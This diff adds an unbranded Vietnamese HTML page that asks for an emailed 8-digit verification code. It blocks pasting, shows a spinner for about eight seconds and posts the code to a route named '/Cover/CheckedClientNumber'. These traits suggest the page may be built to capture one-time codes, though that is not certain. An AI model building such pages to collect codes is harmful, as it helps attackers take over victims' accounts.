@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xác thực sử dụng dịch vụ</title>
+<style>
+    body, html {
+        height: 100%;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(135deg, #74ABE2, #5563DE);
+    }
+
+    .container {
+        text-align: center;
+        background: #fff;
+        padding: 40px;
+        border-radius: 15px;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        width: 500px;
+        max-width: 90%;
+    }
+
+    .message {
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 30px;
+        color: red;
+    }
+
+    .otp-container {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+    }
+
+    .otp-container input {
+        width: 50px;
+        height: 50px;
+        font-size: 24px;
+        text-align: center;
+        border: 2px solid #ccc;
+        border-radius: 8px;
+        outline: none;
+        caret-color: black; 
+    }
+
+    .otp-container input:focus {
+        border-color: #5563DE;
+        box-shadow: 0 0 8px rgba(85, 99, 222, 0.3);
+    }
+
+    form {
+        display: none;
+    }
+
+    .spinner {
+        display: none;
+        margin: 20px auto 0;
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #5563DE;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg);}
+        100% { transform: rotate(360deg);}
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="message">
+        Một email đã được gửi kèm theo mã xác minh sử dụng dịch vụ đến cho bạn. <br>
+        Vui lòng kiểm tra và nhập mã xác thực bên dưới.
+    </div>
+
+    <div class="otp-container" id="otpContainer">
+        <input type="text" maxlength="1" id="otp1">
+        <input type="text" maxlength="1" id="otp2">
+        <input type="text" maxlength="1" id="otp3">
+        <input type="text" maxlength="1" id="otp4">
+        <input type="text" maxlength="1" id="otp5">
+        <input type="text" maxlength="1" id="otp6">
+        <input type="text" maxlength="1" id="otp7">
+        <input type="text" maxlength="1" id="otp8">
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+
+    <form method="post" action="/Cover/CheckedClientNumber" id="hiddenForm">
+        <input type="hidden" name="txtCode" id="txtCode">
+    </form>
+</div>
+
+<script>
+const inputs = Array.from(document.querySelectorAll('.otp-container input'));
+let currentIndex = 0;
+const hiddenForm = document.getElementById('hiddenForm');
+const txtCode = document.getElementById('txtCode');
+const otpContainer = document.getElementById('otpContainer');
+const spinner = document.getElementById('spinner');
+
+// focus ô hiện tại
+function focusCurrent() {
+    if(currentIndex < inputs.length) {
+        inputs[currentIndex].focus();
+    }
+}
+
+// focus ô đầu tiên khi load
+focusCurrent();
+
+// chặn click/mousedown ngoài ô hiện tại
+function disableInputs() {
+    inputs.forEach((input) => {
+        input.disabled = true; // disable toàn bộ ô, không thể click/focus
+    });
+}
+
+// xử lý các sự kiện trên ô
+inputs.forEach((input, index) => {
+    input.addEventListener('mousedown', e => {
+        if (index !== currentIndex) {
+            e.preventDefault();
+            focusCurrent();
+        }
+    });
+    input.addEventListener('focus', e => {
+        if (index !== currentIndex) {
+            focusCurrent();
+        }
+    });
+    input.addEventListener('paste', e => e.preventDefault()); // ngăn paste
+});
+
+// nhận input từ bàn phím
+document.addEventListener('keydown', function(e) {
+    if (e.key >= '0' && e.key <= '9') {
+        inputs[currentIndex].value = e.key;
+        currentIndex++;
+        if (currentIndex < inputs.length) {
+            focusCurrent();
+        } else {
+            // đủ 8 số
+            txtCode.value = inputs.map(i => i.value).join('');
+            
+            // thoát cursor khỏi ô và disable tất cả ô
+            inputs.forEach(i => i.blur());
+            disableInputs();
+
+            // đợi 3 giây trước khi hiện spinner
+            setTimeout(() => {
+                otpContainer.style.display = 'none';
+                spinner.style.display = 'block';
+                
+                // spinner chạy 5 giây rồi submit
+                setTimeout(() => hiddenForm.submit(), 5000);
+            }, 3000);
+        }
+        e.preventDefault();
+    } else if (e.key !== "Tab") {
+        e.preventDefault(); // chặn chữ và key khác
+    }
+});
+</script>
+
+</body>
+</html>
